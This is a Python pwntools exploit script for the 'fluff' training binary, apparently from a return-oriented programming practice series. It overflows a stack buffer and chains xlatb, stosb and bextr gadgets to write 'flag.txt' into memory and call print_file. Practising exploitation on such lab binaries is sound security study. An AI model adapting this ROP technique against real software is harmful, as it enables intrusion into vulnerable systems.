#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./fluff
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./fluff')
context.terminal = ["/usr/bin/konsole", "-e", "sh", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

DATA = 0x601028
RET = p64(0x400295) # ret
POPRDI = p64(0x4006a3) # pop rdi ; ret
POPRDXRCX = p64(0x40062a) # pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret
BEXTRRBXRCXRDX = p64(0x400633) # bextr rbx, rcx, rdx ; ret
STOSB = p64(0x400639) # stosb [rdi], al ; ret
XLATB = p64(0x400628) # xlatb ; ret
MOVEAX0_POPRBP = p64(0x400610) # mov eax, 0 ; pop rbp ; ret
PRINT_FILE = p64(0x400510) # print_file

attack = b"A"*0x28
attack += POPRDI + p64(DATA) # set rdi to data
attack += MOVEAX0_POPRBP + b"12345678" # junk data for rbp
current_al = 0 # zeroed out by MOVEAX0_POPRBP
for byte in b"flag.txt":
    byteloc = next(exe.search(byte))
    # set rbx to byteloc-current_al
    attack += POPRDXRCX + p64(0x4000) + p64(byteloc-current_al-0x3ef2)
    # al = *(rbx + al) = *( (byteloc-current_al) + current_al ) = *byteloc
    attack += XLATB
    attack += STOSB
    # no need to increment rdi because stosb does that for us
    current_al = byte
attack += POPRDI + p64(DATA) + PRINT_FILE

print(attack)
print(len(attack))
io.sendline(attack)

io.interactive()
